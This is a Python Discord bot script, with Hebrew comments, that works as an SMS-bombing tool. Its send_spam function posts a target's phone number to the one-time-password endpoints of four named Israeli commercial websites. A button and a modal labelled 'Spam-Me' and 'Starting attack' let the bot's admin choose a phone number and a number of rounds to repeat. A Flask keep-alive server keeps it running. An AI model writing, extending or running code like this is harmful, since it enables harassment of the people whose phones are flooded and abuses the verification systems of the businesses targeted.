import discord
from discord.ext import commands
from discord import ui
import requests
import uuid
import os
from flask import Flask
from threading import Thread

# --- שרת Flask לשמירה על הבוט ---
app = Flask('')
@app.route('/')
def home(): return "Discord Bot is Online"

def keep_alive():
    t = Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080))))
    t.start()

# --- הגדרות הבוט ---
TOKEN = os.environ.get('DISCORD_TOKEN')
ADMIN_ID = 1281295891579408418

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

# --- פונקציית הספאם (הטורבו שלך) ---
def send_spam(target):
    apis = [
        {"u": "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json"},
        {"u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json"},
        {"u": "https://users-auth.hamal.co.il/auth/send-auth-code", "d": {"value": target, "type": "phone", "projectId": "1"}, "type": "json"},
        {"u": "https://api-ns.atmos.co.il/rest/18/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 18, "source": "web"}, "type": "json"}
    ]
    success = 0
    for site in apis:
        try:
            h = {"User-Agent": "Mozilla/5.0"}
            res = requests.post(site["u"], json=site["d"], headers=h, timeout=1)
            if res.status_code in [200, 201]: success += 1
        except: pass
    return success

# --- חלון קופץ (Modal) ---
class AttackModal(ui.Modal, title='🚀 Spam-Me Control'):
    phone = ui.TextInput(label='Phone Number', placeholder='0501234567', min_length=10, max_length=10)
    rounds = ui.TextInput(label='Rounds to use', placeholder='1 round = 35 seconds', default='1')

    async def on_submit(self, interaction: discord.Interaction):
        if interaction.user.id != ADMIN_ID:
            return await interaction.response.send_message("❌ No Permission", ephemeral=True)
        
        await interaction.response.send_message(f"⚡ Starting attack on {self.phone.value}...", ephemeral=True)
        for r in range(int(self.rounds.value)):
            send_spam(self.phone.value)

# --- כפתור בשרת ---
class AttackView(ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @ui.button(label='🚀 Spam Phone', style=discord.ButtonStyle.primary, custom_id='spam_btn')
    async def spam_button(self, interaction: discord.Interaction, button: ui.Button):
        await interaction.response.send_modal(AttackModal())

@bot.event
async def on_ready():
    print(f'✅ {bot.user.name} is ready!')

@bot.command()
async def setup(ctx):
    if ctx.author.id == ADMIN_ID:
        embed = discord.Embed(title="🚀 Spam-Me", description="Use the button below to interact with the bot.", color=0x5865F2)
        await ctx.send(embed=embed, view=AttackView())

if __name__ == "__main__":
    keep_alive()
    bot.run(TOKEN)
